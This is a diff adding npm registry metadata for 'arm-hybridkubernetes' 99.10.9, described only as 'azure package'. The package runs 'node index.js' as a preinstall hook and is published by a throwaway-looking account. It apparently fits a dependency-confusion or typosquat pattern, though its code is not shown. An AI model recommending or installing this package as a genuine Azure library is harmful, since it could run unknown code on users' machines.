@@ -1,0 +1,62 @@
+{
+    "_id": "arm-hybridkubernetes",
+    "name": "arm-hybridkubernetes",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-hybridkubernetes",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-hybridkubernetes@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-m8hr/5VU7EYOSEjDZEkwYYJXBWZ3XjGdN18oWHaumMeiPRBhB+N6ypY18RX4QCpxYHtjDst/3zYGaW2kj4rKRw==",
+                "shasum": "10ad1cb880976c63932ba559382ec6832b64921f",
+                "tarball": "https://registry.npmjs.org/arm-hybridkubernetes/-/arm-hybridkubernetes-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5072,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNypgACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmo64A/8DIQDae1PJb27cr51jizBs2SyLk+igAocvHMxrSgcQdZmd7oR\r\nblW8WOYfpezwXmZAnQvZcT0DolqFgRYkLyCi/S4AMosgBc5Kz1TbcwfaqE0c\r\nc90ai30RuSNbZ0elWMo6fNlXFkUWhMLohNDdT2ifrLApKD0dtqrIwzvE+OVT\r\n3OrSqM6GP7p/shesxHBOq3iJPxQt7sriwLWyvLtYyVkSVZA56UzCZfzs8ZRG\r\nuransBpUvA6hHDKP9WcW0+YG2KcoZ6k4bOZugFO/vTyBJhPO09zQxlG8WQC5\r\nB1pwckpF9mHhcAi3tK+HYxclA83v3XXhCrqP7mYxe7CuUwIsr1owOh4XbJtI\r\nD3GbinUZW8UqHB5eUKQRcBwJHuRn8cmGwSe0QvUqS9ZHiKG7NIhVrJxWoMgR\r\noc+OPTCN2/90mggRaMXbkmN/cnqc2QE/mnDIxZIFxaDN3yuo/JsWRUlu4mjQ\r\n0hA16P5mIoxUNHgktj7Ye/dKPfAcKA7wXI9kAYR6HbPHWCKZ4zb1OTmx0Z+t\r\nNx2iZoeyOhq/toj8eq1I0V4E4YDqPoSQ3SG+BCYrsYBoGfSl+H8cb1aOw3Uj\r\nCfsjDeSiPVh2jSyz5sJsNe8qYwEokErJEjibCeuGmKxj0UqmQAURClhAFPZL\r\ng3bcN9U69kZGZovs0ljuXhtRsYsqkl5YFzw=\r\n=gccH\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "pkih4zkv",
+                "email": "pkih4zkv@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "pkih4zkv",
+                    "email": "pkih4zkv@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-hybridkubernetes_99.10.9_1647782496186_0.3880041632647966"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T13:21:36.185Z",
+        "99.10.9": "2022-03-20T13:21:36.347Z",
+        "modified": "2022-03-20T13:21:36.432Z"
+    },
+    "maintainers": [
+        {
+            "name": "pkih4zkv",
+            "email": "pkih4zkv@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
